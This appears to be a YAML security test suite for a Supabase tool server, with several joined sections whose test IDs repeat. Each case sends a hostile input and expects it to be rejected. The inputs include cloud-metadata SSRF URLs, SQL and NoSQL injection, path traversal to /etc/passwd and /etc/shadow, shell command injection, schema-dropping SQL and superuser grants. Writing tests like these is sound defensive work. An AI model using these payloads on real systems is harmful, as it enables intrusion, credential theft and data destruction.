metadata:
    version: "1.0"
    target: supabase test server
    focus: Critical security vulnerabilities
tests:
    - test_id: SEC-001
      name: Server-Side Request Forgery (SSRF) via Organization ID
      purpose: |
        Tests if the organization_id parameter is vulnerable to SSRF attacks by attempting
        to access internal cloud metadata services or private network resources. This is
        critical because:
        - Could expose cloud credentials (AWS/GCP/Azure metadata services)
        - May allow access to internal APIs and services
        - Could lead to privilege escalation or data exfiltration
        The system should validate that organization_id is a legitimate UUID/identifier
        and reject URL-like patterns or special characters that could be used in SSRF.
      prerequisites:
        - description: Obtain a valid cost confirmation ID from confirm_cost tool
          variable: VALID_COST_ID
      test_cases:
        - case_id: SEC-001-A
          description: Attempt to access AWS metadata service via organization_id
          input:
            tool: create_project
            arguments:
                confirm_cost_id: ${VALID_COST_ID}
                name: test-project
                organization_id: http://169.254.169.254/latest/meta-data/iam/security-credentials/
                region: us-east-1
          expected_output:
            error_present: true
            error_code_one_of:
                - 400
                - 403
                - 422
                - -32602
            error_response_must_not_match_regex:
                - AKIA[0-9A-Z]{16}
                - aws_secret_access_key
                - SecretAccessKey
                - SessionToken
            result: null
        - case_id: SEC-001-B
          description: Attempt localhost access through organization_id parameter
          input:
            tool: create_project
            arguments:
                confirm_cost_id: ${VALID_COST_ID}
                name: test-project
                organization_id: http://localhost:8080/admin/api
                region: eu-west-1
          expected_output:
            error_present: true
            error_code_one_of:
                - 400
                - 403
                - 422
                - -32602
            error_response_must_not_match_regex:
                - '"token":\s*"[A-Za-z0-9_-]{20,}"'
                - '"api_key":\s*"[A-Za-z0-9_-]{20,}"'
                - localhost:\d+
            result: null
        - case_id: SEC-001-C
          description: Attempt private network access via organization_id
          input:
            tool: create_project
            arguments:
                confirm_cost_id: ${VALID_COST_ID}
                name: test-project
                organization_id: http://10.0.0.1:5432/database
                region: ap-southeast-1
          expected_output:
            error_present: true
            error_code_one_of:
                - 400
                - 403
                - 422
                - -32602
            result: null
    - test_id: SEC-002
      name: SQL/NoSQL Injection in Project Name Parameter
      purpose: |
        Tests if the name parameter is vulnerable to injection attacks that could:
        - Manipulate database queries to access or modify unauthorized data
        - Execute arbitrary SQL commands on the backend database
        - Bypass validation or create malicious project names
        - Lead to data corruption or unauthorized project listing access
        The system must properly sanitize and validate project names to prevent
        injection attacks while storing and querying project metadata.
      prerequisites:
        - description: Obtain a valid organization ID from list_organizations or user config
          variable: VALID_ORG_ID
        - description: Obtain a valid cost confirmation ID from confirm_cost tool
          variable: VALID_COST_ID
      test_cases:
        - case_id: SEC-002-A
          description: SQL injection attempt with comment-based payload in project name
          input:
            tool: create_project
            arguments:
                confirm_cost_id: ${VALID_COST_ID}
                name: test' OR '1'='1' --
                organization_id: ${VALID_ORG_ID}
                region: us-east-1
          expected_output:
            error_present: true
            error_code_one_of:
                - 400
                - 422
                - -32602
            error_response_must_not_match_regex:
                - (?i)syntax error
                - (?i)sql (error|exception)
                - (?i)postgresql.*error
                - (?i)database.*error
                - pg_.*\(
            result: null
        - case_id: SEC-002-B
          description: UNION-based SQL injection in project name
          input:
            tool: create_project
            arguments:
                confirm_cost_id: ${VALID_COST_ID}
                name: test' UNION SELECT id,name,api_key FROM organizations--
                organization_id: ${VALID_ORG_ID}
                region: eu-west-1
          expected_output:
            error_present: true
            error_code_one_of:
                - 400
                - 422
                - -32602
            error_response_must_not_match_regex:
                - (?i)syntax error
                - (?i)union.*select
                - '[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}'
                - eyJ[A-Za-z0-9_-]*\.[A-Za-z0-9_-]*\.[A-Za-z0-9_-]*
            result: null
        - case_id: SEC-002-C
          description: NoSQL injection attempt in project name
          input:
            tool: create_project
            arguments:
                confirm_cost_id: ${VALID_COST_ID}
                name: test"); db.organizations.drop(); //
                organization_id: ${VALID_ORG_ID}
                region: ap-northeast-1
          expected_output:
            error_present: true
            error_code_one_of:
                - 400
                - 422
                - -32602
            result: null
    - test_id: SEC-003
      name: Authorization Bypass via Cost Confirmation Manipulation
      purpose: |
        Tests if the confirm_cost_id parameter can be manipulated to bypass cost
        authorization checks. This is critical because:
        - Could allow unauthorized project creation without proper billing approval
        - May enable privilege escalation to create resources in other organizations
        - Could lead to cost abuse or billing fraud
        - Might expose the cost confirmation mechanism to replay or forgery attacks
        The system must validate that cost confirmations are legitimate, unexpired,
        and properly linked to the requesting user and organization.
      prerequisites:
        - description: Obtain a valid organization ID from list_organizations
          variable: VALID_ORG_ID
      test_cases:
        - case_id: SEC-003-A
          description: Attempt to bypass cost confirmation with null UUID
          input:
            tool: create_project
            arguments:
                confirm_cost_id: 00000000-0000-0000-0000-000000000000
                name: unauthorized-project
                organization_id: ${VALID_ORG_ID}
                region: us-west-1
          expected_output:
            error_present: true
            error_code_one_of:
                - 400
                - 401
                - 403
                - 422
                - -32602
            error_response_must_not_match_regex:
                - '"status":\s*"ACTIVE"'
                - '"project_id":\s*"[a-z]+"'
                - supabase\.co
            result: null
        - case_id: SEC-003-B
          description: Attempt SQL injection through cost confirmation ID
          input:
            tool: create_project
            arguments:
                confirm_cost_id: ''' OR 1=1 --'
                name: test-project
                organization_id: ${VALID_ORG_ID}
                region: ca-central-1
          expected_output:
            error_present: true
            error_code_one_of:
                - 400
                - 401
                - 403
                - 422
                - -32602
            error_response_must_not_match_regex:
                - (?i)syntax error
                - (?i)sql.*error
                - (?i)invalid.*uuid
            result: null
        - case_id: SEC-003-C
          description: Path traversal attempt in confirm_cost_id
          input:
            tool: create_project
            arguments:
                confirm_cost_id: ../../../etc/passwd
                name: test-project
                organization_id: ${VALID_ORG_ID}
                region: eu-central-1
          expected_output:
            error_present: true
            error_code_one_of:
                - 400
                - 401
                - 403
                - 422
                - -32602
            error_response_must_not_match_regex:
                - 'root:.*:0:0:'
                - /etc/passwd
                - /home/[a-zA-Z0-9_-]+
            result: null
    - test_id: SEC-004
      name: Input Validation and Denial of Service via Oversized Parameters
      purpose: |
        Tests if the API properly validates input sizes to prevent denial of service
        attacks. This is important because:
        - Oversized inputs can cause memory exhaustion or service crashes
        - May slow down database operations affecting other users
        - Could be used to bypass rate limiting through single large requests
        - Might expose buffer overflow vulnerabilities in parsing code
        The system should enforce reasonable size limits on all input parameters.
      prerequisites:
        - description: Obtain a valid organization ID
          variable: VALID_ORG_ID
        - description: Obtain a valid cost confirmation ID
          variable: VALID_COST_ID
      test_cases:
        - case_id: SEC-004-A
          description: Attempt to create project with extremely long name (1MB payload)
          input:
            tool: create_project
            arguments:
                confirm_cost_id: ${VALID_COST_ID}
                name: ${'A' * 1048576}
                organization_id: ${VALID_ORG_ID}
                region: us-east-1
          expected_output:
            error_present: true
            error_code_one_of:
                - 400
                - 413
                - 422
                - -32602
            error_response_must_not_match_regex:
                - (?i)out of memory
                - (?i)buffer overflow
                - (?i)segmentation fault
            result: null
        - case_id: SEC-004-B
          description: Test special characters and unicode in project name
          input:
            tool: create_project
            arguments:
                confirm_cost_id: ${VALID_COST_ID}
                name: "test\0project\n\r\t<script>alert(1)</script>\U0001F608\U0001F480\U0001F525"
                organization_id: ${VALID_ORG_ID}
                region: eu-west-1
          expected_output:
            error_present: true
            error_code_one_of:
                - 400
                - 422
                - -32602
            error_response_must_not_match_regex:
                - <script>
                - alert\(1\)
                - \x00
            result: null
    - test_id: SEC-001
      name: Cross-Tenant Project Access Control
      purpose: |
        Tests whether the pause_project tool properly validates that the authenticated user
        has permission to pause the specified project. An attacker could attempt to pause
        projects belonging to other users/organizations by guessing or enumerating project IDs.
        Impact: Denial of service for other tenants, service disruption, potential data
        unavailability if attacker pauses critical production projects.
      test_cases:
        - case_id: SEC-001-A
          description: Attempt to pause project using potentially valid UUID format for unauthorized project
          input:
            tool: pause_project
            arguments:
                project_id: 00000000-0000-0000-0000-000000000000
          expected_output:
            error_present: true
            error_code_one_of:
                - 403
                - 404
                - -32602
            error_response_must_not_match_regex:
                - project_ref["']?\s*:\s*["'][a-zA-Z0-9]{20,}["']
                - api[_-]?key["']?\s*:\s*["'][a-zA-Z0-9_-]{20,}["']
                - database[_-]?url["']?\s*:\s*["']postgres://[^"']+
            result: null
        - case_id: SEC-001-B
          description: Attempt to pause project using enumerated numeric-style project ID
          input:
            tool: pause_project
            arguments:
                project_id: "999999999"
          expected_output:
            error_present: true
            error_code_one_of:
                - 400
                - 403
                - 404
                - -32602
            error_response_must_not_match_regex:
                - Bearer\s+[a-zA-Z0-9_-]{20,}
                - (?:password|token|secret|key)["']?\s*:\s*["'][^"']{8,}["']
            result: null
    - test_id: SEC-002
      name: Project ID Injection Attack
      purpose: |
        Tests for injection vulnerabilities in the project_id parameter. If the backend
        constructs database queries, API calls, or system commands using the project_id
        without proper sanitization, an attacker could inject malicious payloads.
        Impact: Potential SQL injection, NoSQL injection, or command injection leading to
        unauthorized data access, data modification, or system compromise.
      test_cases:
        - case_id: SEC-002-A
          description: SQL injection attempt in project_id parameter
          input:
            tool: pause_project
            arguments:
                project_id: ''' OR ''1''=''1'' --'
          expected_output:
            error_present: true
            error_code_one_of:
                - 400
                - 422
                - -32602
            error_response_must_not_match_regex:
                - SELECT\s+.*\s+FROM
                - UPDATE\s+.*\s+SET
                - syntax\s+error.*near
                - pg_.*\(\)
                - postgres.*error
            result: null
        - case_id: SEC-002-B
          description: NoSQL injection attempt with JSON operators
          input:
            tool: pause_project
            arguments:
                project_id: '{"$ne":null}'
          expected_output:
            error_present: true
            error_code_one_of:
                - 400
                - 422
                - -32602
            error_response_must_not_match_regex:
                - mongodb.*error
                - \$[a-z]+.*operator
                - bson\.
            result: null
        - case_id: SEC-002-C
          description: Command injection attempt in project_id
          input:
            tool: pause_project
            arguments:
                project_id: 'test; curl http://169.254.169.254/latest/meta-data/ #'
          expected_output:
            error_present: true
            error_code_one_of:
                - 400
                - 422
                - -32602
            error_response_must_not_match_regex:
                - ami-id
                - instance-id
                - security-credentials
            result: null
    - test_id: SEC-003
      name: Path Traversal in Project Identifier
      purpose: |
        Tests whether path traversal sequences in the project_id parameter can be exploited
        to access or manipulate files outside the intended project directory. If the backend
        uses project_id to construct file paths for configuration, logs, or data storage,
        an attacker could read sensitive files or modify critical system files.
        Impact: Unauthorized file access, exposure of sensitive configuration files,
        potential for arbitrary file write/delete operations.
      test_cases:
        - case_id: SEC-003-A
          description: Unix path traversal attempt to access system files
          input:
            tool: pause_project
            arguments:
                project_id: ../../../etc/passwd
          expected_output:
            error_present: true
            error_code_one_of:
                - 400
                - 403
                - 422
                - -32602
            error_response_must_not_match_regex:
                - 'root:.*:0:0:'
                - bin:.*:/bin
                - '/home/[a-zA-Z0-9_-]+:'
            result: null
        - case_id: SEC-003-B
          description: Encoded path traversal attempt
          input:
            tool: pause_project
            arguments:
                project_id: ..%2F..%2F..%2Fetc%2Fpasswd
          expected_output:
            error_present: true
            error_code_one_of:
                - 400
                - 403
                - 422
                - -32602
            error_response_must_not_match_regex:
                - 'root:.*:0:0:'
                - '/etc/.*:'
                - nologin|false|bash
            result: null
    - test_id: SEC-004
      name: Information Disclosure in Error Messages
      purpose: |
        Tests whether error responses leak sensitive information such as internal paths,
        database connection strings, API keys, authentication tokens, or system architecture
        details. Verbose error messages can provide attackers with valuable reconnaissance
        information for planning subsequent attacks.
        Impact: Exposure of sensitive credentials, internal system architecture, database
        schema information, or authentication mechanisms that aid in further exploitation.
      test_cases:
        - case_id: SEC-004-A
          description: Test error response for stack trace or internal path disclosure
          input:
            tool: pause_project
            arguments:
                project_id: <script>alert('xss')</script>
          expected_output:
            error_present: true
            error_code_one_of:
                - 400
                - 422
                - -32602
            error_response_must_not_match_regex:
                - /home/[a-zA-Z0-9_-]+/
                - /var/www/
                - /usr/local/
                - at\s+[a-zA-Z0-9_]+\.[a-zA-Z0-9_]+\(
                - File\s+["']/[^"']+["']
                - line\s+\d+.*in\s+/[a-z/]+
            result: null
        - case_id: SEC-004-B
          description: Test for database connection string or credentials in error
          input:
            tool: pause_project
            arguments:
                project_id: '''; SELECT version(); --'
          expected_output:
            error_present: true
            error_code_one_of:
                - 400
                - 422
                - -32602
            error_response_must_not_match_regex:
                - postgres://[^\s@]+:[^\s@]+@
                - (?:password|pwd|pass)["']?\s*[:=]\s*["']?[a-zA-Z0-9@#$%^&*]{8,}
                - (?:database|db)[_-]?(?:host|server)["']?\s*[:=]\s*["']?[a-zA-Z0-9.-]+
                - connection\s+string
                - eyJ[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+
            result: null
    - test_id: SEC-001
      name: Unauthorized Project Restoration via Invalid Project ID
      purpose: |
        Tests for authorization bypass vulnerabilities where an attacker could
        restore another tenant's project by guessing or enumerating project IDs.
        This could lead to unauthorized access to project data, service disruption,
        or privilege escalation. A properly secured system should validate that
        the authenticated user has permission to restore the specified project.
      test_cases:
        - case_id: SEC-001-A
          description: Attempt to restore project using non-existent UUID
          input:
            tool: restore_project
            arguments:
                project_id: 00000000-0000-0000-0000-000000000000
          expected_output:
            error_present: true
            error_code_one_of:
                - 403
                - 404
                - -32602
            error_response_must_not_match_regex:
                - Bearer [a-zA-Z0-9_-]{20,}
                - postgres://[^\s]+
                - postgresql://[^\s]+
            result: null
        - case_id: SEC-001-B
          description: Attempt to restore project using extremely large numeric ID
          input:
            tool: restore_project
            arguments:
                project_id: "999999999999999999999"
          expected_output:
            error_present: true
            error_code_one_of:
                - 400
                - 403
                - 404
                - -32602
            error_response_must_not_match_regex:
                - apikey=[a-zA-Z0-9_-]{20,}
                - password=[^\s&]+
                - api[_-]?key["']?\s*[:=]\s*["']?[a-zA-Z0-9_-]{20,}
            result: null
    - test_id: SEC-002
      name: Path Traversal in Project ID Parameter
      purpose: |
        Tests for path traversal vulnerabilities where an attacker could use
        directory traversal sequences to access or restore unauthorized projects,
        or potentially read sensitive system files if the project_id is used in
        file system operations. This could expose configuration files, credentials,
        or allow unauthorized project restoration.
      test_cases:
        - case_id: SEC-002-A
          description: Attempt path traversal to access parent directories
          input:
            tool: restore_project
            arguments:
                project_id: ../../../etc/passwd
          expected_output:
            error_present: true
            error_code_one_of:
                - 400
                - 403
                - 404
                - -32602
            error_response_must_not_match_regex:
                - 'root:.*:0:0:'
                - /etc/passwd
                - /home/[a-zA-Z0-9_-]+
                - /root/
            result: null
        - case_id: SEC-002-B
          description: Attempt Windows-style path traversal
          input:
            tool: restore_project
            arguments:
                project_id: ..\..\..\windows\system32\config\sam
          expected_output:
            error_present: true
            error_code_one_of:
                - 400
                - 403
                - 404
                - -32602
            error_response_must_not_match_regex:
                - C:\\[Ww]indows
                - \\system32\\
                - Administrator
            result: null
        - case_id: SEC-002-C
          description: Attempt absolute path access to sensitive files
          input:
            tool: restore_project
            arguments:
                project_id: /etc/shadow
          expected_output:
            error_present: true
            error_code_one_of:
                - 400
                - 403
                - 404
                - -32602
            error_response_must_not_match_regex:
                - \$[0-9][a-z]?\$[^:]{10,}
                - /etc/shadow
            result: null
    - test_id: SEC-003
      name: SQL Injection in Project ID Parameter
      purpose: |
        Tests for SQL injection vulnerabilities where the project_id parameter
        might be used in database queries without proper sanitization. Successful
        exploitation could allow attackers to execute arbitrary SQL commands,
        leading to data exfiltration, data manipulation, privilege escalation,
        or complete database compromise.
      test_cases:
        - case_id: SEC-003-A
          description: Classic SQL injection with OR clause
          input:
            tool: restore_project
            arguments:
                project_id: ''' OR ''1''=''1'
          expected_output:
            error_present: true
            error_code_one_of:
                - 400
                - 403
                - 404
                - -32602
            error_response_must_not_match_regex:
                - syntax error at or near
                - pg_[a-z_]+\(
                - SELECT.*FROM.*WHERE
                - PostgreSQL
            result: null
        - case_id: SEC-003-B
          description: SQL injection with UNION-based attack
          input:
            tool: restore_project
            arguments:
                project_id: ''' UNION SELECT apikey, secret FROM projects WHERE ''1''=''1'
          expected_output:
            error_present: true
            error_code_one_of:
                - 400
                - 403
                - 404
                - -32602
            error_response_must_not_match_regex:
                - '[a-f0-9]{32,}'
                - apikey
                - UNION.*SELECT
            result: null
        - case_id: SEC-003-C
          description: SQL injection attempting table creation and cleanup
          input:
            tool: restore_project
            arguments:
                project_id: '''; CREATE TABLE test_sec003 AS SELECT 1; DROP TABLE test_sec003; --'
          expected_output:
            error_present: true
            error_code_one_of:
                - 400
                - 403
                - 404
                - -32602
            error_response_must_not_match_regex:
                - CREATE TABLE
                - successfully created
                - test_sec003
            result: null
    - test_id: SEC-004
      name: Information Disclosure via Error Messages
      purpose: |
        Tests whether error messages leak sensitive information such as database
        connection strings, API keys, internal paths, stack traces, or system
        configuration details. Information disclosure can help attackers map
        the system architecture and plan more sophisticated attacks.
      test_cases:
        - case_id: SEC-004-A
          description: Test for credential leakage in error responses using XSS payload
          input:
            tool: restore_project
            arguments:
                project_id: <script>alert('xss')</script>
          expected_output:
            error_present: true
            error_code_one_of:
                - 400
                - 403
                - 404
                - -32602
            error_response_must_not_match_regex:
                - postgres://[^\s]+
                - postgresql://[^@]+:[^@]+@
                - SUPABASE_[A-Z_]+=[^\s]+
                - Bearer [a-zA-Z0-9_-]{20,}
                - /var/[a-z]+/[^\s]+
            result: null
        - case_id: SEC-004-B
          description: Test for stack trace and internal path disclosure
          input:
            tool: restore_project
            arguments:
                project_id: '{{7*7}}'
          expected_output:
            error_present: true
            error_code_one_of:
                - 400
                - 403
                - 404
                - -32602
            error_response_must_not_match_regex:
                - at [A-Za-z0-9_]+\.[a-z]+:[0-9]+
                - /usr/local/[^\s]+
                - node_modules/[^\s]+
                - Traceback \(most recent call last\)
                - File "[^"]+", line [0-9]+
            result: null
    - test_id: SEC-001
      name: SQL Injection in Migration Query Parameter
      purpose: |
        Tests for SQL injection vulnerabilities in the query parameter that could allow
        attackers to execute arbitrary SQL commands, access unauthorized data, or modify
        database structure. This is CRITICAL as migrations typically run with elevated
        privileges and could lead to complete database compromise, data exfiltration,
        or denial of service through destructive operations.
      prerequisites:
        - description: Obtain from user configuration or project listing
          variable: VALID_PROJECT_ID
      test_cases:
        - case_id: SEC-001-A
          description: SQL injection attempt to extract sensitive data via UNION-based attack
          input:
            tool: apply_migration
            arguments:
                name: test_migration_union
                project_id: ${VALID_PROJECT_ID}
                query: SELECT 1; SELECT * FROM auth.users WHERE email LIKE '%@%' UNION SELECT table_name, column_name, NULL, NULL FROM information_schema.columns--
          expected_output:
            error_present: true
            error_code_one_of:
                - 400
                - 403
                - -32602
            error_response_must_not_match_regex:
                - '[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}'
                - \$2[aby]\$[0-9]{2}\$[./A-Za-z0-9]{53}
                - '[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}'
                - auth\.users|public\.[a-zA-Z_]+
            result: null
        - case_id: SEC-001-B
          description: Destructive SQL injection attempt using stacked queries to drop tables
          input:
            tool: apply_migration
            arguments:
                name: test_migration_drop
                project_id: ${VALID_PROJECT_ID}
                query: CREATE TABLE test_table (id INT); DROP TABLE IF EXISTS test_table CASCADE; DROP SCHEMA IF EXISTS public CASCADE; CREATE SCHEMA public;
          expected_output:
            error_present: true
            error_code_one_of:
                - 400
                - 403
                - -32602
            error_response_must_not_match_regex:
                - DROP TABLE .* succeeded
                - schema .* dropped
                - CASCADE executed
            result: null
        - case_id: SEC-001-C
          description: SQL injection to bypass migration controls and execute privileged operations
          input:
            tool: apply_migration
            arguments:
                name: test_migration_privilege
                project_id: ${VALID_PROJECT_ID}
                query: SELECT 1; ALTER USER postgres WITH SUPERUSER; GRANT ALL PRIVILEGES ON ALL TABLES IN SCHEMA public TO anon; SET ROLE postgres;--
          expected_output:
            error_present: true
            error_code_one_of:
                - 400
                - 403
                - -32602
            error_response_must_not_match_regex:
                - ALTER ROLE
                - GRANT.*succeeded
                - SET ROLE.*postgres
            result: null
    - test_id: SEC-002
      name: Path Traversal and Command Injection in Migration Name
      purpose: |
        Tests for path traversal and command injection vulnerabilities in the migration
        name parameter. If migration names are used to create files or execute system
        commands without proper sanitization, attackers could read/write arbitrary files,
        execute system commands, or manipulate the migration tracking system. This could
        lead to code execution, privilege escalation, or bypassing migration controls.
      prerequisites:
        - description: Obtain from user configuration or project listing
          variable: VALID_PROJECT_ID
      test_cases:
        - case_id: SEC-002-A
          description: Path traversal attempt to write migration outside intended directory
          input:
            tool: apply_migration
            arguments:
                name: ../../../etc/passwd_migration
                project_id: ${VALID_PROJECT_ID}
                query: SELECT 1;
          expected_output:
            error_present: true
            error_code_one_of:
                - 400
                - 403
                - -32602
            error_response_must_not_match_regex:
                - /etc/passwd
                - 'root:.*:0:0:'
                - /home/[a-zA-Z0-9_-]+/
            result: null
        - case_id: SEC-002-B
          description: Command injection attempt via migration name using shell metacharacters
          input:
            tool: apply_migration
            arguments:
                name: test_migration; cat /etc/passwd > /tmp/pwned; echo
                project_id: ${VALID_PROJECT_ID}
                query: SELECT 1;
          expected_output:
            error_present: true
            error_code_one_of:
                - 400
                - 403
                - -32602
            error_response_must_not_match_regex:
                - 'root:.*:0:0:'
                - /bin/bash|/bin/sh
                - command executed
            result: null
        - case_id: SEC-002-C
          description: Null byte injection to truncate migration name validation
          input:
            tool: apply_migration
            arguments:
                name: "valid_migration\0; DROP TABLE users;--"
                project_id: ${VALID_PROJECT_ID}
                query: SELECT 1;
          expected_output:
            error_present: true
            error_code_one_of:
                - 400
                - 403
                - -32602
            result: null
    - test_id: SEC-003
      name: Cross-Project Unauthorized Migration Access
      purpose: |
        Tests for authorization vulnerabilities where an attacker could apply migrations
        to projects they don't own or have access to. This could allow privilege escalation,
        unauthorized database modifications, or data breaches across tenant boundaries.
        Critical for multi-tenant security where project_id is the primary isolation mechanism.
      test_cases:
        - case_id: SEC-003-A
          description: Attempt to apply migration using non-existent project ID
          input:
            tool: apply_migration
            arguments:
                name: unauthorized_migration
                project_id: 00000000-0000-0000-0000-000000000000
                query: SELECT 1;
          expected_output:
            error_present: true
            error_code_one_of:
                - 403
                - 404
                - -32602
            error_response_must_not_match_regex:
                - 'project_ref: [a-zA-Z0-9]{20}'
                - 'database: [a-zA-Z0-9_-]+'
                - 'host: [a-zA-Z0-9.-]+\.[a-zA-Z]{2,}'
            result: null
        - case_id: SEC-003-B
          description: Attempt to apply migration with SQL injection in project_id
          input:
            tool: apply_migration
            arguments:
                name: injection_test
                project_id: ''' OR ''1''=''1'
                query: SELECT 1;
          expected_output:
            error_present: true
            error_code_one_of:
                - 400
                - 403
                - 404
                - -32602
            error_response_must_not_match_regex:
                - '[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}'
                - project_id.*[a-zA-Z0-9]{20}
            result: null
        - case_id: SEC-003-C
          description: Attempt to enumerate valid project IDs through error message differences
          input:
            tool: apply_migration
            arguments:
                name: test_migration
                project_id: aaaaaaaa-bbbb-cccc-dddd-eeeeeeeeeeee
                query: SELECT 1;
          expected_output:
            error_present: true
            error_code_one_of:
                - 403
                - 404
                - -32602
            error_response_must_not_match_regex:
                - project [a-zA-Z0-9-]+ exists
                - valid project_id format
                - project found but access denied
                - db\.[a-zA-Z0-9]+\.supabase
            result: null
    - test_id: SEC-004
      name: Information Disclosure in Migration Error Messages
      purpose: |
        Tests whether error messages from failed migrations leak sensitive information
        such as database credentials, internal paths, connection strings, table structures,
        or stack traces. This information could help attackers map the database schema,
        identify vulnerable components, or obtain credentials for further attacks.
      prerequisites:
        - description: Obtain from user configuration or project listing
          variable: VALID_PROJECT_ID
      test_cases:
        - case_id: SEC-004-A
          description: Trigger syntax error to check for stack trace or internal path disclosure
          input:
            tool: apply_migration
            arguments:
                name: syntax_error_test
                project_id: ${VALID_PROJECT_ID}
                query: SELCT * FORM non_existent_table WHERE invalid syntax here;
          expected_output:
            error_present: true
            error_code_one_of:
                - 400
                - -32602
            error_response_must_not_match_regex:
                - /home/[a-zA-Z0-9_-]+/
                - /var/www/[a-zA-Z0-9_/-]+
                - /usr/local/[a-zA-Z0-9_/-]+
                - at [a-zA-Z]+\.[a-zA-Z]+:[0-9]+
                - Traceback|Stack trace
                - password=[a-zA-Z0-9]+
                - postgres://[a-zA-Z0-9:@.-]+/
            result: null
        - case_id: SEC-004-B
          description: Attempt to access system tables to trigger error with schema information
          input:
            tool: apply_migration
            arguments:
                name: system_table_access
                project_id: ${VALID_PROJECT_ID}
                query: SELECT * FROM pg_shadow; SELECT * FROM pg_authid;
          expected_output:
            error_present: true
            error_code_one_of:
                - 400
                - 403
                - -32602
            error_response_must_not_match_regex:
                - rolpassword
                - \$2[aby]\$[0-9]{2}\$[./A-Za-z0-9]{53}
                - pg_shadow|pg_authid
                - rolname.*postgres
            result: null
        - case_id: SEC-004-C
          description: Test oversized query to check for resource exhaustion error disclosure
          input:
            tool: apply_migration
            arguments:
                name: large_query_test
                project_id: ${VALID_PROJECT_ID}
                query: SELECT 1 WHERE '{{ 'A' * 5000000 }}' = 'test';
          expected_output:
            error_present: true
            error_code_one_of:
                - 400
                - 413
                - -32602
            error_response_must_not_match_regex:
                - memory.*[0-9]+\s*(MB|GB|bytes)
                - max_.*size.*exceeded
                - Connection.*[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}
                - pooler.*[a-zA-Z0-9.-]+:[0-9]+
            result: null
    - test_id: SEC-001
      name: SQL Injection - Data Exfiltration via UNION-based Attack
      purpose: |
        Tests if the execute_sql tool is vulnerable to UNION-based SQL injection attacks
        that could allow attackers to extract sensitive data from other tables, including
        user credentials, API keys, or confidential business data. This is CRITICAL because
        successful exploitation could lead to complete database compromise and data breach.
      test_cases:
        - case_id: SEC-001-A
          description: UNION SELECT attack attempting to extract data from system tables
          input:
            tool: execute_sql
            arguments:
                project_id: ${VALID_PROJECT_ID}
                query: SELECT * FROM users WHERE id = 1 UNION SELECT table_name, column_name, data_type, NULL, NULL FROM information_schema.columns--
          expected_output:
            error_present: true
            error_code_one_of:
                - 400
                - 403
                - -32602
            error_response_must_not_match_regex:
                - information_schema
                - pg_catalog
                - table_name.*column_name
            result: null
        - case_id: SEC-001-B
          description: Boolean-based blind SQL injection to extract sensitive data
          input:
            tool: execute_sql
            arguments:
                project_id: ${VALID_PROJECT_ID}
                query: SELECT * FROM products WHERE id = 1 AND (SELECT COUNT(*) FROM pg_user WHERE usename='postgres' AND usesuper=true) > 0--
          expected_output:
            error_present: true
            error_code_one_of:
                - 400
                - 403
                - -32602
            error_response_must_not_match_regex:
                - pg_user
                - usename
                - usesuper
            result: null
        - case_id: SEC-001-C
          description: Stacked query injection attempting to create unauthorized table
          input:
            tool: execute_sql
            arguments:
                project_id: ${VALID_PROJECT_ID}
                query: SELECT * FROM users; CREATE TABLE malicious_test_xyz123 (data text); DROP TABLE malicious_test_xyz123; --
          expected_output:
            error_present: true
            error_code_one_of:
                - 400
                - 403
                - -32602
            result: null
    - test_id: SEC-002
      name: SQL Injection - Privilege Escalation and Authentication Bypass
      purpose: |
        Tests if SQL injection can be used to bypass authentication checks or escalate
        privileges by manipulating WHERE clauses. This is CRITICAL because it could allow
        attackers to gain administrative access, modify access controls, or impersonate
        other users without valid credentials.
      prerequisites:
        - description: Obtain valid project_id from Supabase project configuration
          variable: VALID_PROJECT_ID
      test_cases:
        - case_id: SEC-002-A
          description: Authentication bypass using OR 1=1 tautology
          input:
            tool: execute_sql
            arguments:
                project_id: ${VALID_PROJECT_ID}
                query: SELECT * FROM users WHERE username='admin' AND password='x' OR '1'='1'--
          expected_output:
            error_present: true
            error_code_one_of:
                - 400
                - 403
                - -32602
            result: null
        - case_id: SEC-002-B
          description: Privilege escalation via UPDATE injection with comment
          input:
            tool: execute_sql
            arguments:
                project_id: ${VALID_PROJECT_ID}
                query: UPDATE users SET role='user' WHERE id=999; UPDATE users SET role='admin' WHERE username='attacker'-- WHERE id=1
          expected_output:
            error_present: true
            error_code_one_of:
                - 400
                - 403
                - -32602
            result: null
        - case_id: SEC-002-C
          description: Cross-tenant data access via injected WHERE clause modification
          input:
            tool: execute_sql
            arguments:
                project_id: ${VALID_PROJECT_ID}
                query: SELECT * FROM tenant_data WHERE tenant_id='tenant1' OR 1=1-- AND user_id='user1'
          expected_output:
            error_present: true
            error_code_one_of:
                - 400
                - 403
                - -32602
            result: null
    - test_id: SEC-003
      name: Information Disclosure via SQL Error Messages
      purpose: |
        Tests if database error messages leak sensitive information such as table names,
        column names, database structure, internal paths, or system configuration details.
        This is HIGH severity because leaked information aids attackers in crafting more
        sophisticated attacks and reveals the internal architecture of the system.
      test_cases:
        - case_id: SEC-003-A
          description: Trigger syntax error to check if full SQL query is exposed in error
          input:
            tool: execute_sql
            arguments:
                project_id: ${VALID_PROJECT_ID}
                query: SELECT * FROM users WHERE invalid_syntax <> @#$%
          expected_output:
            error_present: true
            error_code_one_of:
                - 400
                - 500
                - -32603
            error_response_must_not_match_regex:
                - SELECT \* FROM users
                - invalid_syntax
                - 'LINE \d+:'
                - DETAIL:.*
                - HINT:.*
            result: null
        - case_id: SEC-003-B
          description: Access non-existent table to check for schema information leakage
          input:
            tool: execute_sql
            arguments:
                project_id: ${VALID_PROJECT_ID}
                query: SELECT * FROM nonexistent_table_xyz789
          expected_output:
            error_present: true
            error_code_one_of:
                - 400
                - 404
                - -32602
            error_response_must_not_match_regex:
                - relation ".*" does not exist
                - schema ".*"
                - public\.
                - pg_catalog
            result: null
        - case_id: SEC-003-C
          description: Reference non-existent column to check for table structure disclosure
          input:
            tool: execute_sql
            arguments:
                project_id: ${VALID_PROJECT_ID}
                query: SELECT nonexistent_column_abc FROM users
          expected_output:
            error_present: true
            error_code_one_of:
                - 400
                - -32602
            error_response_must_not_match_regex:
                - column ".*" does not exist
                - Did you mean:.*
                - available columns:.*
